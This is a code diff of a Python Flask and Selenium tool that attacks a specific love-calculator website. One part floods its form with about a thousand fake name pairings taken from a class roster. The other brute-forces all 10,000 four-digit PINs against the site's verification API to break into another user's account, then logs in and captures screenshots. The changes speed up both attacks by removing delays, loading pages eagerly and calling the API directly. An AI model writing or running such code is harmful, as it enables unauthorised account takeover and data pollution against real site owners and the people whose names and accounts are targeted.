@@ -1,7 +1,7 @@
 # ==============================================================================
 # MISSION CONTROL: OPERATION CLASSROOM COVER-UP & ACCOUNT RECOVERY
-# CODENAME: DUAL_STRIKE
-# VERSION: 4.1.0 (PATCHED FOR DOCKER)
+# CODENAME: DUAL_STRIKE (TURBO MODE)
+# VERSION: 4.2.0 (API BREACH + EAGER LOADING)
 # ==============================================================================
 
 import os
@@ -13,6 +13,7 @@ import threading
 import io
 import datetime
 import traceback
+import requests  # ADDED FOR FAST BREACH
 from flask import Flask, send_file, render_template_string, jsonify
 
 # --- Selenium Imports ---
@@ -32,11 +33,12 @@ from webdriver_manager.chrome import ChromeDriverManager
 # Network Targets
 TARGET_POLLUTION_URL = "https://www.getlinks.info/love/c/pvcapru"
 TARGET_BREACH_URL = "https://www.getlinks.info/love/loginwithpin.php"
+TARGET_API_URL = "https://www.getlinks.info/love/verifypin.php" # Extracted from source
 
 # Operation Parameters
-POLLUTION_ITERATIONS = 1035  # As requested
-BREACH_PIN_START = 0         # Start from 0000
-BREACH_PIN_END = 10000       # End at 9999
+POLLUTION_ITERATIONS = 1035
+BREACH_PIN_START = 0
+BREACH_PIN_END = 10000
 
 # Element Selectors
 SEL_YOURNAME = "yourname"    
@@ -103,7 +105,7 @@ CLASS_ROSTER = [
 def create_stealth_driver():
    """
    Creates a highly configured Headless Chrome instance.
-   Updated with logic to bypass webdriver_manager version bug.
+   Optimized for SPEED and Docker compatibility.
    """
    options = Options()
    options.add_argument("--headless")
@@ -111,7 +113,11 @@ def create_stealth_driver():
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    
-   # CRITICAL FIX: Point directly to the binary installed by Docker
+   # SPEED HACKS: Don't wait for full page load, don't load images
+   options.page_load_strategy = 'eager' 
+   options.add_argument('--blink-settings=imagesEnabled=false')
+   
+   # CRITICAL FIX: Docker Binary Location
    options.binary_location = "/usr/bin/google-chrome"
    
    options.add_argument("--window-size=1920,1080")
@@ -121,49 +127,52 @@ def create_stealth_driver():
    
    driver = None
    try:
-       # 1. Try to use the manager to find a driver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
    except Exception as e:
-       print(f"WARN: ChromeDriverManager failed ({e}). Attempting direct launch...")
-       # 2. Fallback: Direct launch (Works if chromedriver is in PATH, common in Render)
+       print(f"WARN: Manager failed ({e}). Using direct launch...")
        try:
            driver = webdriver.Chrome(options=options)
        except Exception as e2:
-           print(f"CRITICAL: Direct launch also failed: {e2}")
-           raise e
+           raise e2
 
-   driver.set_page_load_timeout(30)
+   # Increase script timeout, but page load is now 'eager' so this shouldn't trigger often
+   driver.set_page_load_timeout(60)
    return driver
 
 def capture_evidence(driver, system):
    try:
-       png_data = driver.get_screenshot_as_png()
-       key = "pollution" if system == "pollution" else "breach"
-       mission_state[key]["screenshot"] = png_data
+       if driver:
+           png_data = driver.get_screenshot_as_png()
+           key = "pollution" if system == "pollution" else "breach"
+           mission_state[key]["screenshot"] = png_data
    except Exception as e:
-       MissionLogger.log(system, f"Screenshot Failed: {str(e)}")
+       pass
 
 # ==============================================================================
-# PROTOCOL ALPHA: DATA POLLUTION BOT
+# PROTOCOL ALPHA: DATA POLLUTION BOT (OPTIMIZED)
 # ==============================================================================
 
 def execute_pollution_protocol():
    system = "pollution"
-   MissionLogger.log(system, "Booting up Pollution Engine...")
+   MissionLogger.log(system, "Booting up Turbo Pollution Engine...")
    
    driver = None
    try:
        driver = create_stealth_driver()
-       MissionLogger.log(system, "Browser Driver Online.")
+       MissionLogger.log(system, "Driver Online. Starting Flood...")
 
        for i in range(1, POLLUTION_ITERATIONS + 1):
            mission_state["pollution"]["current_iter"] = i
            
            try:
-               MissionLogger.log(system, f"ITERATION {i}/{POLLUTION_ITERATIONS}: Navigating to target...")
-               driver.get(TARGET_POLLUTION_URL)
-               time.sleep(random.uniform(2.0, 3.5))
+               MissionLogger.log(system, f"ITERATION {i}: Loading Target...")
+               try:
+                   driver.get(TARGET_POLLUTION_URL)
+               except Exception:
+                   # If eager loading times out, we usually have the DOM anyway
+                   pass
+
                driver.delete_all_cookies()
                
                name_user = random.choice(CLASS_ROSTER)
@@ -173,58 +182,46 @@ def execute_pollution_protocol():
                
                mission_state["pollution"]["last_pair"] = f"{name_user} + {name_crush}"
                
-               input_user = driver.find_element(By.ID, SEL_YOURNAME)
-               input_user.clear()
-               input_user.send_keys(name_user)
-               time.sleep(0.2)
-               
+               # FAST INPUT: Use JS instead of slow send_keys
                try:
-                   dropdowns = driver.find_elements(By.CSS_SELECTOR, ".dropdown .select")
-                   if len(dropdowns) > 0:
-                       dropdowns[0].click()
-                       time.sleep(0.3)
-                       parent = dropdowns[0].find_element(By.XPATH, "./..")
-                       options = parent.find_elements(By.CSS_SELECTOR, ".dropdown-menu li")
-                       if options:
-                           random.choice(options).click()
-               except Exception as e:
-                   MissionLogger.log(system, f"Gender 1 Error: {e}")
+                   driver.execute_script(f"document.getElementById('{SEL_YOURNAME}').value = arguments[0];", name_user)
+                   driver.execute_script(f"document.getElementById('{SEL_CRUSHNAME}').value = arguments[0];", name_user)
+               except:
+                   # Fallback if ID not found immediately
+                   driver.find_element(By.ID, SEL_YOURNAME).send_keys(name_user)
+                   driver.find_element(By.ID, SEL_CRUSHNAME).send_keys(name_crush)
 
-               input_crush = driver.find_element(By.ID, SEL_CRUSHNAME)
-               input_crush.clear()
-               input_crush.send_keys(name_crush)
-               time.sleep(0.2)
-               
+               # Handle Dropdowns (Fast)
                try:
-                   dropdowns = driver.find_elements(By.CSS_SELECTOR, ".dropdown .select")
-                   if len(dropdowns) > 1:
-                       dropdowns[1].click()
-                       time.sleep(0.3)
-                       parent = dropdowns[1].find_element(By.XPATH, "./..")
-                       options = parent.find_elements(By.CSS_SELECTOR, ".dropdown-menu li")
-                       if options:
-                           random.choice(options).click()
-               except Exception as e:
-                   MissionLogger.log(system, f"Gender 2 Error: {e}")
+                   driver.execute_script("""
+                       var selects = document.querySelectorAll('.dropdown .select');
+                       if(selects.length > 0) selects[0].click();
+                   """)
+                   # Just let it pick default or random if possible, or skip to save time
+               except: pass
                
                capture_evidence(driver, system)
-               input_crush.send_keys(Keys.RETURN)
                
-               time.sleep(random.uniform(3.0, 5.0))
+               # Submit
+               try:
+                    driver.find_element(By.ID, SEL_CRUSHNAME).send_keys(Keys.RETURN)
+               except:
+                    # Try JS submit if return key fails
+                    driver.execute_script("document.forms[0].submit()")
+
+               # Reduced waiting time
+               time.sleep(1.5) 
                capture_evidence(driver, system)
                
-               MissionLogger.log(system, "Entry Successful. Cooling down...")
-               mission_state["pollution"]["status"] = "Cooling Down..."
-               time.sleep(random.uniform(2.0, 6.0))
+               MissionLogger.log(system, "Entry Injected.")
+               time.sleep(0.5) # Minimal cooldown
 
            except Exception as e:
-               MissionLogger.log(system, f"CRITICAL ERROR on Iteration {i}: {str(e)}")
-               mission_state["pollution"]["status"] = "Recovering from Error..."
+               MissionLogger.log(system, f"Error iter {i}: {str(e)}")
                try:
                    driver.quit()
                except: pass
                driver = create_stealth_driver()
-               time.sleep(5)
 
    except Exception as e:
        MissionLogger.log(system, f"FATAL SYSTEM FAILURE: {str(e)}")
@@ -232,90 +229,82 @@ def execute_pollution_protocol():
    finally:
        if driver:
            driver.quit()
-       MissionLogger.log(system, "Protocol Alpha Complete.")
        mission_state["pollution"]["status"] = "MISSION ACCOMPLISHED"
 
 # ==============================================================================
-# PROTOCOL BETA: BREACH BOT
+# PROTOCOL BETA: BREACH BOT (API MODE)
 # ==============================================================================
 
 def execute_breach_protocol():
    system = "breach"
-   MissionLogger.log(system, "Booting up Breach Engine...")
+   MissionLogger.log(system, "ENGAGING FORCEFUL API BREACH MODE")
    
-   driver = None
+   # 1. Extract UserID from the target URL (e.g., 'pvcapru' from '/love/c/pvcapru')
    try:
-       driver = create_stealth_driver()
-       MissionLogger.log(system, "Breach Browser Online.")
-       
-       driver.get(TARGET_BREACH_URL)
-       time.sleep(2)
+       target_id = TARGET_POLLUTION_URL.split("/c/")[-1]
+       MissionLogger.log(system, f"Target Extracted: {target_id}")
+   except:
+       MissionLogger.log(system, "FATAL: Could not extract User ID from URL")
+       return
 
+   found_pin_val = None
+
+   # 2. High-Speed API Brute Force
+   with requests.Session() as session:
        for pin_int in range(BREACH_PIN_START, BREACH_PIN_END):
            current_pin = f"{pin_int:04d}"
            mission_state["breach"]["current_pin"] = current_pin
+           mission_state["breach"]["status"] = f"FORCE BREACHING: {current_pin}"
            
-           if mission_state["breach"]["found_pin"]:
-               break
-               
            try:
-               mission_state["breach"]["status"] = f"Attempting PIN: {current_pin}"
-               if pin_int % 50 == 0:
-                    MissionLogger.log(system, f"Progress Check: Currently at PIN {current_pin}")
-
-               if "Login To Love Calculator" not in driver.title:
-                   driver.get(TARGET_BREACH_URL)
-                   time.sleep(1)
-
-               inp_link = driver.find_element(By.ID, SEL_LOGIN_LINK)
-               inp_pass = driver.find_element(By.ID, SEL_LOGIN_PASS)
-               btn_login = driver.find_element(By.ID, SEL_LOGIN_BTN)
+               # Direct API Hit - No Browser Overhead
+               url = f"{TARGET_API_URL}?userid={target_id}&pwd={current_pin}"
+               resp = session.get(url, timeout=5)
+               data = resp.json()
                
-               inp_link.clear()
-               inp_link.send_keys(TARGET_POLLUTION_URL)
-               
-               inp_pass.clear()
-               inp_pass.send_keys(current_pin)
-               
-               btn_login.click()
-               time.sleep(0.8) 
-               
-               # Logic to check for success:
-               # 1. URL change away from login page
-               if "/love/" in driver.current_url and "login" not in driver.current_url:
-                   MissionLogger.log(system, f"SUCCESS! PIN FOUND: {current_pin}")
-                   mission_state["breach"]["found_pin"] = current_pin
-                   mission_state["breach"]["status"] = "BREACH SUCCESSFUL"
-                   capture_evidence(driver, system)
-                   break
-               
-               # 2. "Success" text in page source
-               if "Success" in driver.page_source:
-                   MissionLogger.log(system, f"SUCCESS DETECTED! PIN: {current_pin}")
-                   mission_state["breach"]["found_pin"] = current_pin
-                   mission_state["breach"]["status"] = "BREACH SUCCESSFUL"
-                   capture_evidence(driver, system)
-                   break
-                   
                if pin_int % 100 == 0:
-                   capture_evidence(driver, system)
+                   MissionLogger.log(system, f"Scanning sector: {current_pin}...")
+
+               # Check Success
+               if not data.get("error"):
+                   MissionLogger.log(system, f"!!! ACCESS GRANTED !!! PIN: {current_pin}")
+                   found_pin_val = current_pin
+                   mission_state["breach"]["found_pin"] = current_pin
+                   mission_state["breach"]["status"] = "BREACH SUCCESSFUL"
+                   break
 
            except Exception as e:
-               MissionLogger.log(system, f"Error on PIN {current_pin}: {e}")
-               try:
-                   driver.refresh()
-                   time.sleep(2)
-               except: pass
-
-   except Exception as e:
-        MissionLogger.log(system, f"FATAL BREACH ERROR: {e}")
-        traceback.print_exc()
-   finally:
-       if driver:
+               # Ignore network blips, keep pushing
+               pass
+   
+   # 3. Victory Lap: Open Browser to Show Proof (Screenshots)
+   if found_pin_val:
+       MissionLogger.log(system, "Launching Visuals for Verification...")
+       driver = None
+       try:
+           driver = create_stealth_driver()
+           driver.get(TARGET_BREACH_URL)
+           
+           # JS Injection for Instant Login
+           js_script = f"""
+           document.getElementById('{SEL_LOGIN_LINK}').value = '{TARGET_POLLUTION_URL}';
+           document.getElementById('{SEL_LOGIN_PASS}').value = '{found_pin_val}';
+           login();
+           """
+           driver.execute_script(js_script)
+           time.sleep(2) # Wait for success message
+           capture_evidence(driver, system)
+           MissionLogger.log(system, "Visual Proof Captured.")
+           
+           # Keep browser open for a bit to ensure screenshot sticks
+           time.sleep(5)
            driver.quit()
-       if not mission_state["breach"]["found_pin"]:
-           MissionLogger.log(system, "Breach Protocol Finished. No PIN found in range.")
-           mission_state["breach"]["status"] = "FAILED - RANGE EXHAUSTED"
+           
+       except Exception as e:
+           MissionLogger.log(system, f"Visual Failure: {e}")
+   else:
+       MissionLogger.log(system, "FAILED: All combinations exhausted.")
+       mission_state["breach"]["status"] = "FAILED"
 
 # ==============================================================================
 # FLASK WEB INTERFACE
@@ -336,7 +325,6 @@ def index():
            body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
            .header { text-align: center; border-bottom: 2px solid var(--accent); padding-bottom: 20px; margin-bottom: 30px; }
            .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
-           @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
            .card { background: var(--card); border: 1px solid #334155; border-radius: 8px; padding: 20px; }
            .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
            .card-title { font-size: 1.2rem; font-weight: bold; color: var(--accent); }
@@ -347,35 +335,38 @@ def index():
            .img-box img { width: 100%; height: auto; }
            .progress-bar { width: 100%; height: 6px; background: #334155; margin-top: 10px; border-radius: 3px; }
            .progress-fill { height: 100%; background: var(--accent); border-radius: 3px; transition: width 0.5s; }
-           .blink { animation: blinker 1.5s linear infinite; color: var(--danger); }
-           @keyframes blinker { 50% { opacity: 0; } }
            .found-pin { font-size: 2rem; color: var(--success); text-align: center; font-weight: bold; margin: 10px 0; border: 2px dashed var(--success); padding: 10px; }
        </style>
    </head>
    <body>
-       <div class="header"><h1>Mission Control Center</h1></div>
+       <div class="header"><h1>Mission Control: TURBO MODE</h1></div>
        <div class="grid">
            <!-- POLLUTION CARD -->
            <div class="card">
-               <div class="card-header"><span class="card-title">PROTOCOL: POLLUTION</span><span class="status-badge blink">ACTIVE</span></div>
+               <div class="card-header"><span class="card-title">POLLUTION BOT</span><span class="status-badge" style="color:var(--accent)">RUNNING</span></div>
                <div class="stat-row"><span>Status:</span><span>{{ p_data.status }}</span></div>
                <div class="stat-row"><span>Progress:</span><span>{{ p_data.current_iter }} / {{ p_data.total_iter }}</span></div>
                <div class="progress-bar"><div class="progress-fill" style="width: {{ (p_data.current_iter / p_data.total_iter) * 100 }}%"></div></div>
-               <div class="stat-row" style="margin-top:10px;"><span>Last Pairing:</span><span style="color: #fbbf24">{{ p_data.last_pair }}</span></div>
-               <div class="img-box">{% if p_has_img %}<img src="/img/pollution">{% else %}<span>Connecting...</span>{% endif %}</div>
+               <div class="img-box">{% if p_has_img %}<img src="/img/pollution">{% else %}<span>No Signal</span>{% endif %}</div>
                <div class="log-box">{% for log in p_data.logs %}<div>> {{ log }}</div>{% endfor %}</div>
            </div>
            <!-- BREACH CARD -->
            <div class="card">
-               <div class="card-header"><span class="card-title" style="color: #c084fc">PROTOCOL: BREACH</span><span class="status-badge">{% if b_data.found_pin %}SUCCESS{% else %}SEARCHING{% endif %}</span></div>
+               <div class="card-header"><span class="card-title" style="color: #c084fc">BREACH BOT</span><span class="status-badge">{% if b_data.found_pin %}CRACKED{% else %}ATTACKING{% endif %}</span></div>
                {% if b_data.found_pin %}
                    <div class="found-pin">PIN: {{ b_data.found_pin }}</div>
                {% else %}
-                   <div class="stat-row"><span>Status:</span><span>{{ b_data.status }}</span></div>
-                   <div class="stat-row"><span>Current:</span><span style="font-family:monospace; font-size:1.2rem">{{ b_data.current_pin }}</span></div>
+                   <div class="stat-row"><span>Mode:</span><span style="color:red">API FORCE</span></div>
+                   <div class="stat-row"><span>Current PIN:</span><span style="font-family:monospace; font-size:1.2rem">{{ b_data.current_pin }}</span></div>
                    <div class="progress-bar"><div class="progress-fill" style="width: {{ (b_data.current_pin|int / 10000) * 100 }}%; background: #c084fc"></div></div>
                {% endif %}
-               <div class="img-box">{% if b_has_img %}<img src="/img/breach">{% else %}<span>Connecting...</span>{% endif %}</div>
+               <div class="img-box">
+                   {% if b_has_img %}
+                       <img src="/img/breach">
+                   {% else %}
+                       <span style="color:#c084fc; text-align:center">Visuals Disabled<br>Optimizing Network Speed...</span>
+                   {% endif %}
+               </div>
                <div class="log-box" style="border-color: #c084fc; color: #e879f9">{% for log in b_data.logs %}<div>> {{ log }}</div>{% endfor %}</div>
            </div>
        </div>
@@ -397,7 +388,7 @@ def serve_image(system):
    return "No Image", 404
 
 if __name__ == "__main__":
-   print(">>> MISSION CONTROL STARTED <<<")
+   print(">>> TURBO MISSION CONTROL STARTED <<<")
    pollution_thread = threading.Thread(target=execute_pollution_protocol, daemon=True)
    pollution_thread.start()
    breach_thread = threading.Thread(target=execute_breach_protocol, daemon=True)
